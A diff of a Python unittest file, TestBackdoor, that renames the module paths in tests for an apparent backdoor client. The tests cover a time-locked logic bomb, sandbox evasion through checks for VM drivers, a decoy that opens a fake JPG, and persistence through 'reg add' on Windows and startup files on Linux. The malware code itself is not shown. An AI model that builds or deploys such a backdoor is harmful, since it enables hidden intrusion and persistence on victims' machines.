@@ -7,21 +7,21 @@ import json
 import socket
 
 # Import client and server modules
-import src.client as client
-import src.server as server
+import src.module.client as client
+import src.module.server as server
 
 class TestBackdoor(unittest.TestCase):
     
-    @patch('src.client.os')
-    @patch('src.client.time')
+    @patch('src.module.client.os')
+    @patch('src.module.client.time')
     def test_logic_bomb_future_time(self, mock_time, mock_os):
         # 模擬時間鎖迴圈：第一次檢查未到目標時間，第二次檢查時時間抵達，跳出等待
         mock_time.time.side_effect = [1779340799, 1779340801]
         mock_os.path.exists.return_value = False
         self.assertTrue(client.logic_bomb())
 
-    @patch('src.client.os')
-    @patch('src.client.time')
+    @patch('src.module.client.os')
+    @patch('src.module.client.time')
     def test_logic_bomb_sandbox_detected(self, mock_time, mock_os):
         # Test sandbox evasion triggers when VM drivers are found
         mock_time.time.return_value = 1779340801
@@ -29,8 +29,8 @@ class TestBackdoor(unittest.TestCase):
         mock_os.path.exists.return_value = True
         self.assertFalse(client.logic_bomb())
 
-    @patch('src.client.os')
-    @patch('src.client.time')
+    @patch('src.module.client.os')
+    @patch('src.module.client.time')
     def test_logic_bomb_success(self, mock_time, mock_os):
         # Test logic bomb passes under normal, valid conditions
         mock_time.time.return_value = 1779340801
@@ -54,10 +54,10 @@ class TestBackdoor(unittest.TestCase):
         result = client.recv_all(mock_socket, 4)
         self.assertIsNone(result)
 
-    @patch('src.client.open', new_callable=mock_open)
-    @patch('src.client.subprocess.Popen')
-    @patch('src.client.os.startfile')
-    @patch('src.client.sys')
+    @patch('src.module.client.open', new_callable=mock_open)
+    @patch('src.module.client.subprocess.Popen')
+    @patch('src.module.client.os.startfile')
+    @patch('src.module.client.sys')
     def test_open_fake_jpg_windows(self, mock_sys, mock_startfile, mock_popen, mock_file):
         # Test JPG decoy execution on Windows
         mock_sys.platform = "win32"
@@ -69,9 +69,9 @@ class TestBackdoor(unittest.TestCase):
         mock_startfile.assert_called_once()
         mock_popen.assert_not_called()
 
-    @patch('src.client.open', new_callable=mock_open)
-    @patch('src.client.subprocess.Popen')
-    @patch('src.client.sys')
+    @patch('src.module.client.open', new_callable=mock_open)
+    @patch('src.module.client.subprocess.Popen')
+    @patch('src.module.client.sys')
     def test_open_fake_jpg_linux(self, mock_sys, mock_popen, mock_file):
         # Test JPG decoy execution on Linux
         mock_sys.platform = "linux"
@@ -84,10 +84,10 @@ class TestBackdoor(unittest.TestCase):
         # Ensure xdg-open is called
         self.assertEqual(mock_popen.call_args[0][0][0], "xdg-open")
 
-    @patch('src.client.shutil.copyfile')
-    @patch('src.client.subprocess.run')
-    @patch('src.client.os.path.exists')
-    @patch('src.client.sys')
+    @patch('src.module.client.shutil.copyfile')
+    @patch('src.module.client.subprocess.run')
+    @patch('src.module.client.os.path.exists')
+    @patch('src.module.client.sys')
     def test_persist_windows(self, mock_sys, mock_exists, mock_run, mock_copyfile):
         # Test persistence path on Windows
         mock_sys.platform = "win32"
@@ -99,12 +99,12 @@ class TestBackdoor(unittest.TestCase):
         mock_run.assert_called_once()
         self.assertIn("reg add", mock_run.call_args[0][0])
 
-    @patch('src.client.shutil.copyfile')
-    @patch('src.client.os.path.exists')
-    @patch('src.client.os.makedirs')
-    @patch('src.client.os.chmod')
-    @patch('src.client.sys')
-    @patch('src.client.open', new_callable=mock_open)
+    @patch('src.module.client.shutil.copyfile')
+    @patch('src.module.client.os.path.exists')
+    @patch('src.module.client.os.makedirs')
+    @patch('src.module.client.os.chmod')
+    @patch('src.module.client.sys')
+    @patch('src.module.client.open', new_callable=mock_open)
     def test_persist_linux(self, mock_file, mock_sys, mock_chmod, mock_makedirs, mock_exists, mock_copyfile):
         # Test persistence path on Linux
         mock_sys.platform = "linux"
